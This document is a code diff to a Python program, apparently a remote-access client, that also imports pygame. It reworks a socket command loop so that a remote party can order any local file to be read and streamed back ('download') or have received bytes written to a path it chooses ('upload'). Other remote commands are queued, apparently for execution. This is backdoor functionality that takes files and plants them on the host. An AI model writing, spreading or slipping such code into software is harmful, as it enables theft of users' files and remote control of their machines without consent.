@@ -11,18 +11,19 @@
 
 # Import core python needed modules
 
-import sys
-import time
-import socket
-import requests
 import platform as plat
+import requests
+import socket
 import random
 import pygame
+import time
+import sys
+import re
 
 from subprocess import Popen
 from subprocess import PIPE
 from threading  import Thread
-from os import path
+from os         import path
 
 # Global Variables
 
@@ -397,6 +398,7 @@ def bytes_to_number(b):
 
 def handleCommands():
     global Connected
+    global sock
 
     while True:
         if Connected == False:
@@ -410,27 +412,63 @@ def handleCommands():
         if data:
             if data != "END":
                 print(data)
-                if "open" in data:
+                if data.startswith("download"):
                     contents = ""
-                    filename = data[5:]
+                    filename = data[len("download")+1:]
+
                     try:
-                        f    = open(filename, "rb")
-                        size = path.getsize(filename)
-                        sock.send(convert_to_bytes(size))
+                        input_file = open(filename, "rb")
+                        file_size  = path.getsize(filename)
+
+                        sock.send(convert_to_bytes(file_size))
+
                         time.sleep(0.2)
 
-                        d = f.read(1024)
+                        data = input_file.read(1024)
 
                         while True:
-                            sock.send(d)
-                            d = f.read(1024)
-                            if not d:
+                            sock.send(data)
+
+                            data = input_file.read(1024)
+
+                            if not data:
                                 break
 
-                        f.close()
+                        input_file.close()
+                    
                     except FileNotFoundError:
                         print("No such file in directory")
                         continue
+                
+                elif data.startswith("upload"):
+                    file_size    = 0
+                    current_size = 0
+                    buffer       = b""
+                    output_file_location = re.split(" ", data[len("upload")+1:])[1]
+                    output_file  = open(output_file_location, "wb+")
+
+                    while True:
+                        data = sock.recv(4)
+
+                        if data != "":
+                            file_size = bytes_to_number(data)
+                            break
+
+                    while current_size < file_size:
+                        data = sock.recv(1024)
+
+                        if not data:
+                            break
+
+                        if len(data) + current_size > file_size:
+                            data = data[:file_size-current_size]
+                        
+                        buffer += data
+                        
+                        current_size += len(data)
+
+                    output_file.write(buffer)
+                    output_file.close()
                 else:
                     print("Command : " + data)
                     cmds.append(data)
